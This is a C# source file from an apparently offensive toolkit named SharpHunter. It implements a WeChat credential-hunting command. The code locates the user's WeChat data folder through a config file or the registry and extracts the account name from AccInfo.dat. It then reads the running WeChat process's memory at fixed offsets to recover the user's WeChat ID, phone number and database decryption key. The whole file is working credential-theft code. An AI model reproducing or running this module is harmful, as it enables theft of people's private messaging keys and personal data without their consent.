// WeChatCred.cs
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SharpHunter.Utils;

namespace SharpHunter.Commands
{
    public class WeChatCredCommand : ICommand
    {
        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting WeChatKey from the WeChat process.");
            GetWechatCred();
        }

        public static void GetWechatCred()
        {
            Logger.TaskHeader("Hunting WeChat", 1);
            Logger.WriteLine("[*] Hunted WeChat Credentials:");
            string path = GetFolderPath();
            if (Directory.Exists(path))
            {
                string[] subdirectories = Directory.GetDirectories(path, "*", SearchOption.AllDirectories);

                foreach (string subdirectory in subdirectories)
                {
                    string msgFolderPath = Path.Combine(subdirectory, "Msg");
                    if (Directory.Exists(msgFolderPath))
                    {
                        string folderName = Path.GetFileName(subdirectory);
                        Logger.WriteLine(string.Format("\n [*] Find Wxid: {0}", CommonUtils.CombinePaths(subdirectory, "config", "AccInfo.dat")));
                        byte[] UserNameBytes = GetWechatUserNameBytes(folderName, CommonUtils.CombinePaths(subdirectory, "config", "AccInfo.dat"));
                        if (UserNameBytes != null)
                        {
                            GetWechatKey(UserNameBytes);
                        }
                    }
                }
            }
            else
            {
                Logger.WriteLine(string.Format("[-] The specified path '{0}' does not exist.", path));
            }
        }

        private const uint PROCESS_VM_READ = 0x0010;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;

        static byte[] GetWechatUserNameBytes(string wxid, string filePath)
        {
            if (string.IsNullOrEmpty(filePath) || !File.Exists(filePath))
            {
                Logger.WriteLine("[-] Invalid file path or file does not exist.");
                return null;
            }

            byte[] wxidBytes = Encoding.UTF8.GetBytes(wxid);
            byte[] fileBytes = File.ReadAllBytes(filePath);

            int index = FindByteArray(fileBytes, wxidBytes);
            if (index != -1)
            {
                int startExtract = index + wxidBytes.Length + 6;
                if (startExtract >= fileBytes.Length)
                {
                    Logger.WriteLine("[-] Index out of range when extracting username.");
                    return null;
                }

                byte[] rearBytes = fileBytes.Skip(startExtract).ToArray();
                int index_1a = Array.IndexOf(rearBytes, (byte)0x1A);
                if (index_1a != -1)
                {
                    rearBytes = rearBytes.Take(index_1a).ToArray();
                }

                Logger.WriteLine(" [+] UserName: " + Encoding.UTF8.GetString(rearBytes));

                string hexString = BitConverter.ToString(rearBytes).Replace("-", "");
                Logger.WriteLine(" [+] Username (Hex): " + hexString);
                return rearBytes;
            }
            else
            {
                Logger.WriteLine("[-] Specified string not found.");
                return null;
            }
        }

        static int FindByteArray(byte[] source, byte[] pattern)
        {
            int patternLength = pattern.Length;
            int totalLength = source.Length - patternLength + 1;

            for (int i = 0; i < totalLength; i++)
            {
                if (source.Skip(i).Take(patternLength).SequenceEqual(pattern))
                {
                    return i;
                }
            }
            return -1;
        }

        public static string GetHex(IntPtr hProcess, IntPtr lpBaseAddress)
        {
            byte[] array = new byte[8];
            if (!NTAPI.ReadProcessMemory(hProcess, lpBaseAddress, array, array.Length, out int bytesRead))
            {
                return "1";
            }

            ulong baseAddress2 = BitConverter.ToUInt64(array, 0);

            const int num = 32;
            byte[] array2 = new byte[num];
            if (!NTAPI.ReadProcessMemory(hProcess, (IntPtr)baseAddress2, array2, array2.Length, out bytesRead))
            {
                int error = Marshal.GetLastWin32Error();
                return string.Format("2; Error Code: {0}", error);
            }

            return NTAPI.BytesToHex(array2);
        }

        public static string GetFolderPath()
        {
            string folderPath = null;
            string username = Environment.GetEnvironmentVariable("USERNAME");
            if (string.IsNullOrEmpty(username))
            {
                Logger.WriteLine("[-] Unable to get username.");
                return null;
            }
            string configIniPath = CommonUtils.CombinePaths("C:\\Users", username, "AppData", "Roaming", "Tencent", "WeChat", "All Users", "config", "3ebffe94.ini");
            try
            {
                if (File.Exists(configIniPath))
                {
                    string fileContent = File.ReadAllText(configIniPath, Encoding.UTF8).Trim();

                    if (fileContent.Equals("MyDocument:", StringComparison.OrdinalIgnoreCase))
                    {
                        folderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "WeChat Files");
                    }
                    else
                    {
                        folderPath = Path.Combine(fileContent, "WeChat Files");
                    }
                }
                else
                {
                    Logger.WriteLine(string.Format("[-] Cannot open file {0}, trying to read from registry.", configIniPath));

                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Tencent\WeChat"))
                    {
                        if (key != null)
                        {
                            folderPath = key.GetValue("FileSavePath") as string;

                            if (string.IsNullOrEmpty(folderPath))
                            {
                                Logger.WriteLine("[-] Cannot read FileSavePath from registry.");
                                return null;
                            }
                        }
                        else
                        {
                            Logger.WriteLine("[-] Cannot open registry key.");
                            return null;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine(string.Format("[-] Error occurred: {0}", ex.Message));
                return null;
            }

            return folderPath;
        }

        private static void GetWechatKey(byte[] UserNameBytes)
        {
            Process process = Process.GetProcessesByName("WeChat").FirstOrDefault();
            if (process == null)
            {
                Logger.WriteLine(" [-] WeChat Not Run");
                return;
            }
            Logger.WriteLine(" [+] WeChatProcessPID: " + process.Id.ToString());

            IntPtr processHandle = NTAPI.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, process.Id);
            if (processHandle == IntPtr.Zero)
            {
                return;
            }

            try
            {
                ProcessModule weChatWinModule = process.Modules.Cast<ProcessModule>().FirstOrDefault(m => m.ModuleName.Equals("WeChatWin.dll", StringComparison.OrdinalIgnoreCase));
                if (weChatWinModule == null)
                {
                    Logger.WriteLine(" [-] WeChat Base Address Get Failed");
                    return;
                }

                IntPtr moduleBaseAddress = weChatWinModule.BaseAddress;
                int moduleSize = weChatWinModule.ModuleMemorySize;

                byte[] buffer = new byte[moduleSize];
                if (NTAPI.ReadProcessMemory(processHandle, moduleBaseAddress, buffer, buffer.Length, out int bytesRead))
                {
                    int matchIndex = FindPattern(buffer, UserNameBytes);
                    if (matchIndex != -1)
                    {
                        IntPtr userNameAddress = new IntPtr(moduleBaseAddress.ToInt64() + matchIndex);
                        Logger.WriteLine(string.Format(" [*] Username Address: WeChatWin.dll+0x{0:X}", matchIndex));

                        int weChatIDOffset = 1336;
                        int phoneNumberOffset = -192;
                        int keyOffset = 1272;

                        IntPtr weChatIDAddress = new IntPtr(userNameAddress.ToInt64() + weChatIDOffset);
                        Logger.WriteLine(string.Format(" [*] WeChatID Address: WeChatWin.dll+0x{0:X}", matchIndex + weChatIDOffset));

                        IntPtr phoneNumberAddress = new IntPtr(userNameAddress.ToInt64() + phoneNumberOffset);
                        Logger.WriteLine(string.Format(" [*] PhoneNum Address: WeChatWin.dll+0x{0:X}", matchIndex + phoneNumberOffset));

                        IntPtr keyAddress = new IntPtr(userNameAddress.ToInt64() + keyOffset);
                        Logger.WriteLine(string.Format(" [*] WechatKey Address: WeChatWin.dll+0x{0:X}", matchIndex + keyOffset));

                        byte[] weChatIDBuffer = new byte[32];
                        if (NTAPI.ReadProcessMemory(processHandle, weChatIDAddress, weChatIDBuffer, weChatIDBuffer.Length, out bytesRead))
                        {
                            int nullIndex = Array.IndexOf(weChatIDBuffer, (byte)0);
                            string weChatID = Encoding.UTF8.GetString(weChatIDBuffer, 0, nullIndex >= 0 ? nullIndex : weChatIDBuffer.Length);
                            Logger.WriteLine(string.Format(" [+] WechatID: {0}", weChatID));
                        }
                        else
                        {
                            Logger.WriteLine(" [-] Hunting WechatID Failed");
                        }

                        byte[] phoneNumberBuffer = new byte[32];
                        if (NTAPI.ReadProcessMemory(processHandle, phoneNumberAddress, phoneNumberBuffer, phoneNumberBuffer.Length, out bytesRead))
                        {
                            int nullIndex = Array.IndexOf(phoneNumberBuffer, (byte)0);
                            string phoneNumber = Encoding.UTF8.GetString(phoneNumberBuffer, 0, nullIndex >= 0 ? nullIndex : phoneNumberBuffer.Length);
                            Logger.WriteLine(string.Format(" [+] PhoneNum: {0}", phoneNumber));
                        }

                        string key = GetHex(processHandle, keyAddress);
                        Logger.WriteLine(string.Format(" [+] WechatKey: {0}", key));
                    }
                    else
                    {
                        Logger.WriteLine(" [-] No matching username bytes found.");
                    }
                }
                else
                {
                    Logger.WriteLine("[-] Cannot read WeChatWin.dll memory.");
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine(string.Format("[-] Exception occurred: {0}", ex.Message));
            }
            finally
            {
                NTAPI.CloseHandle(processHandle);
            }
        }

        private static int FindPattern(byte[] buffer, byte[] pattern)
        {
            for (int i = 0; i <= buffer.Length - pattern.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (buffer[i + j] != pattern[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found)
                {
                    return i;
                }
            }
            return -1;
        }
    }
}